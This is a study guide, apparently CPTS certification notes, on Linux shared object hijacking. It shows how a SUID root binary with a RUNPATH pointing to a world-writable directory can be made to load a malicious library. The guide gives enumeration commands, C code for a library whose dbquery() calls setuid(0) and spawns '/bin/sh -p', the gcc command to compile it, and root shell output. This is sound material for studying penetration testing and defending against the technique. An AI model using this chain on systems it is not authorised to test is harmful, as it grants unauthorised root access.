## 1. What Is Shared Object Hijacking?

Linux programs can depend on dynamically linked libraries:

```text
.so
```

If a privileged binary loads a shared object from a location that an attacker can **write to**, the attacker may be able to replace the legitimate library with a malicious one.

### Core idea

```text
SETUID binary
      ↓
Loads .so from custom location
      ↓
Custom location is writable
      ↓
Replace/create malicious .so
      ↓
Binary loads attacker-controlled library
      ↓
Library code executes with binary's privileges
      ↓
ROOT
```

This is called **Shared Object Hijacking**.

---

# 2. Start With the SUID Binary

Example:

```bash
ls -la payroll
```

Output:

```text
-rwsr-xr-x 1 root root 16728 Sep 1 22:05 payroll
```

Important:

```text
-rwsr-xr-x
   ↑
  SUID
```

The binary executes with the privileges of its owner:

```text
Owner = root
   ↓
SUID payroll
   ↓
Library loaded by payroll may execute in root context
```

---

# 3. Use `ldd` to Find Shared Libraries

Run:

```bash
ldd payroll
```

Example:

```text
linux-vdso.so.1 => ...
libshared.so => /development/libshared.so
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
/lib64/ld-linux-x86-64.so.2
```

The interesting dependency is:

```text
libshared.so => /development/libshared.so
```

Why?

Because `/development` is **not a normal system library directory**.

This is a strong reason to investigate further.

---

# 4. Investigate `RUNPATH`

Use:

```bash
readelf -d payroll | grep PATH
```

Example:

```text
0x000000000000001d (RUNPATH) Library runpath: [/development]
```

This tells us the binary has a configured library search path:

```text
payroll
   ↓
RUNPATH
   ↓
/development
   ↓
Search/load library
```

---

# 5. Check Directory Permissions

Now determine whether the library directory is writable:

```bash
ls -la /development/
```

Example:

```text
drwxrwxrwx 2 root root 4096 Sep 1 22:06 ./
```

The important part:

```text
drwxrwxrwx
       ↑
others have write permission
```

Therefore:

```text
/development
      ↓
Writable by attacker
```

Combine that with:

```text
payroll
   ↓
SUID root
   ↓
RUNPATH=/development
   ↓
/development writable
```

🚨 **Very high-value privilege-escalation finding.**

---

# 6. Confirm the Library Dependency

The module demonstrates copying an existing library:

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

Then:

```bash
./payroll
```

The program produces:

```text
symbol lookup error: ./payroll: undefined symbol: dbquery
```

This error is extremely useful.

It tells us that the binary expects a function called:

```text
dbquery
```

from `libshared.so`.

---

# 7. Why the `dbquery` Error Matters

The dependency relationship is:

```text
payroll
   │
   └── requires libshared.so
              │
              └── requires function:
                    dbquery()
```

When our replacement library doesn't contain `dbquery()`:

```text
payroll
   ↓
loads malicious/replacement library
   ↓
looks for dbquery()
   ↓
NOT FOUND
   ↓
symbol lookup error
```

This gives us the function name we need to reproduce in our malicious shared object.

---

# 8. Create the Malicious Library

The module uses:

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

Important function:

```text
dbquery()
```

The function:

```text
setuid(0)
```

attempts to set the UID to root.

Then:

```text
/bin/sh -p
```

starts a shell while preserving privileges.

---

# 9. Compile the Shared Object

Compile:

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

Important options:

```text
-fPIC
   ↓
Position-independent code

-shared
   ↓
Create shared library

-o /development/libshared.so
   ↓
Write malicious library to the
library search path
```

Result:

```text
src.c
  ↓
gcc
  ↓
/development/libshared.so
```

---

# 10. Execute the SUID Binary

Run:

```bash
./payroll
```

The binary loads:

```text
/development/libshared.so
```

instead of the legitimate library.

The malicious library provides:

```text
dbquery()
```

so the symbol lookup succeeds.

Then:

```text
dbquery()
   ↓
setuid(0)
   ↓
/bin/sh -p
   ↓
ROOT SHELL
```

Module output:

```text
Malicious library loaded
```

Then:

```bash
id
```

Output:

```text
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

The important point is:

```text
uid=0(root)
```

---

# 11. Complete Attack Chain

```text
                SHARED OBJECT HIJACKING
                         │
                         ↓
                  Find SUID binary
                         │
                         ↓
                    ldd payroll
                         │
                         ↓
              Find custom .so dependency
                         │
                         ↓
              readelf -d payroll | grep PATH
                         │
                         ↓
                  Find RUNPATH
                         │
                         ↓
                /development
                         │
                         ↓
               Is directory writable?
                         │
                        YES
                         ↓
            Determine required function
                         │
                         ↓
                   dbquery()
                         │
                         ↓
             Create malicious .so
                         │
                         ↓
             Place it in RUNPATH
                         │
                         ↓
                  Execute SUID
                         │
                         ↓
              Library loaded as root
                         │
                         ↓
                     ROOT
```

---

# 12. Enumeration Methodology

When you encounter an unusual SUID binary:

### Step 1 — Confirm SUID

```bash
ls -la <binary>
```

Look for:

```text
-rws
```

### Step 2 — Enumerate dependencies

```bash
ldd <binary>
```

Look for:

```text
custom .so
```

especially paths such as:

```text
/development/
/opt/
/tmp/
/home/<user>/
```

### Step 3 — Inspect library search path

```bash
readelf -d <binary> | grep PATH
```

Look for:

```text
RPATH
RUNPATH
```

### Step 4 — Check permissions

```bash
ls -la <library-directory>
```

Ask:

```text
Can I write here?
```

### Step 5 — Identify required symbols/functions

The module demonstrates using the loader error:

```text
undefined symbol: dbquery
```

### Step 6 — Create matching `.so`

The malicious library must provide the expected function.

### Step 7 — Execute and verify

```bash
./<binary>
```

Then:

```bash
id
```

---

# 13. RPATH / RUNPATH Concept

The important idea is that the binary can tell the dynamic linker where to search for libraries.

```text
Binary
  │
  ↓
Library search configuration
  │
  ├── RUNPATH
  ├── RPATH
  ├── system library paths
  └── other mechanisms
```

If a privileged binary references an attacker-writable directory, the attacker may be able to control which `.so` gets loaded.

---

# 14. Shared Object Hijacking vs LD_PRELOAD

These two techniques are closely related but **not the same**.

### LD_PRELOAD

Attacker explicitly supplies:

```text
LD_PRELOAD=/tmp/root.so
```

and a privileged program loads that library.

```text
sudo
 ↓
LD_PRELOAD
 ↓
malicious .so
 ↓
root
```

### Shared Object Hijacking

The **binary itself** is configured to search an attacker-writable location.

```text
SUID binary
 ↓
RUNPATH=/development
 ↓
/development writable
 ↓
malicious .so
 ↓
root
```

### CPTS distinction

```text
LD_PRELOAD
→ Control the environment variable

Shared Object Hijacking
→ Control the library found by the binary
```

---

# 🔥 CPTS Must-Know Commands

### Find dependencies

```bash
ldd payroll
```

### Find RPATH/RUNPATH

```bash
readelf -d payroll | grep PATH
```

### Check directory permissions

```bash
ls -la /development/
```

### Compile malicious shared object

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

### Execute target

```bash
./payroll
```

### Verify privilege

```bash
id
```

---

# 🚨 High-Value Finding Pattern

Memorize this:

```text
SUID root binary
      +
Custom .so
      +
RPATH/RUNPATH points to writable directory
      ↓
Shared Object Hijacking
```

For example:

```text
-rwsr-xr-x root root payroll
             │
             ↓
       RUNPATH=/development
             │
             ↓
      writable by attacker
             │
             ↓
   /development/libshared.so
             │
             ↓
       malicious library
             │
             ↓
            ROOT
```

---

# 🧠 Final Revision Card

```text
       SHARED OBJECT HIJACKING
       ═══════════════════════

             SUID binary
                  │
                  ↓
             ldd <binary>
                  │
                  ↓
          Custom .so found
                  │
                  ↓
       readelf -d <binary>
                  │
                  ↓
         RPATH / RUNPATH
                  │
                  ↓
       Is referenced directory
            writable?
             /       \
           NO         YES
           │           │
         Stop          ↓
                 Identify function
                       │
                       ↓
                 Create malicious
                      .so
                       │
                       ↓
                Place in path
                       │
                       ↓
                 Run SUID binary
                       │
                       ↓
                  ROOT SHELL
```

### 🔑 One-line memory trick

**`SUID → ldd → custom .so → readelf PATH → writable directory → matching function → malicious .so → root`**